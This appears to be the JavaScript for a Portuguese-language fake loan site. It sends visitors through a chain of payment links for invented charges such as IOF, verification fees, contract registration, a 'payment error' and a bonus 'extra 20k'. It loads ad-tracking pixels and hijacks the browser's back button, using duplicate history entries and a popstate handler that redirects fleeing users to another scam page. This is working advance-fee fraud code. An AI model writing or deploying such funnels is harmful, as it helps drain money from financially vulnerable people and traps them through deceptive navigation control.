const baseLinks = {
  up1: "https://pay.seguranca-agora.shop/eApQgz2RrXRgEb7", // IOF
  up2: "https://pay.seguranca-agora.shop/mwK436dY6bWGQ8b", // Taxa de verificação de IOF
  up3: "https://pay.seguranca-agora.shop/ODAK3LlyOv23E6V", // Seguro Prestamista "tarifa de cadastro"
  up4: "https://pay.seguranca-agora.shop/nQ7kZ7pYLeNG0eJ", // NFe
  up5: "https://pay.seguranca-agora.shop/RmA83EaPdv83PVp", // Ativar conta
  up6: "https://pay.seguranca-agora.shop/6YQPgjnL0kagpxz", // Taxa de registro do contrato
  up7: "https://pay.seguranca-agora.shop/1VOvGV4yMJj3D62", // Parabéns, 20k adicional
  up8: "https://pay.seguranca-agora.shop/1VOvGV4yMJj3D62", // Erro no pagamento - 14,06
  up9: "https://pay.seguranca-agora.shop/JqoR32bM6963Vj5", // APP - 11,99
  up10: "https://pay.seguranca-agora.shop/YL9jZDWYqPl3p4q", // Taxa de Abertura TAC - 16,92
  up11: "https://pay.seguranca-agora.shop/lqv130yY6w8Zxbj", // Taxa de Consultoria Financeira - 19,53
  up12: "https://pay.seguranca-agora.shop/q510ZObBNXA3E9D", // Taxa de Processamento Administrativo - 31,92
};

function redirect(key) {
  try {
    if (!baseLinks[key]) {
      throw new Error(`Link para ${key} não encontrado!`);
    }

    const url = new URL(baseLinks[key]);
    url.search = new URLSearchParams(window.location.search).toString();

    window.location.href = url.href;
  } catch (error) {
    console.error("Erro no redirecionamento:", error);
    alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
  }
}

// UTMIFY, troque o pixel só aqui, belê?
(function () {
  window.pixelId = "6818447034a3779352d0228a";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
  document.head.appendChild(a);
})();

(function () {
  const script = document.createElement("script");

  script.src = "https://cdn.utmify.com.br/scripts/utms/latest.js";
  script.setAttribute("data-utmify-prevent-xcod-sck", "");
  script.setAttribute("data-utmify-prevent-subids", "");
  script.async = true;
  script.defer = true;

  document.head.appendChild(script);
})();

const backRedirectBackLink =
  "https://agilemprestimosoficial.site/agil-type-vega/up/back/";

// Adiciona duas entradas no histórico para capturar a navegação para trás
history.pushState({}, "", location.href);
history.pushState({}, "", location.href);

// Captura o evento de navegação para trás e redireciona
window.onpopstate = function () {
  setTimeout(() => {
    location.href = backRedirectBackLink;
  }, 1);
};
